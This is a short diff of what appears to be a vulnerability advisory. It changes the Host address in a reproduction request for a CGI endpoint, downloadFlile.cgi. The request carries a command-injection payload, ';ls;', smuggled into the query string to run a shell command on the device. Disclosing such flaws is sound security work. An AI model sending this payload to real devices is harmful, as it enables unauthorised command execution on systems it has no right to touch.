@@ -36,7 +36,7 @@ In order to reproduce the vulnerability, the following steps can be followed:
 
 ```
 GET /cgi-bin/downloadFlile.cgi?;ls; HTTP/1.1 
-Host: 192.168.111.12 
+Host: 192.168.0.1 
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0 
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 
 Accept-Encoding: gzip, deflate 
